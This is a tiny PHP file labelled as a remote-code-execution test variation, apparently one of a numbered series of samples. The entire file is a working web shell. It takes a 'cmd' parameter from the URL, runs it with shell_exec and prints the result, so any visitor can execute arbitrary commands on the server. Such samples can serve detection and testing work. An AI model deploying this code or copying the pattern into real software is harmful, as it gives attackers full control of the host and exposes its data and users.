<?php
// RCE test variation #307
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>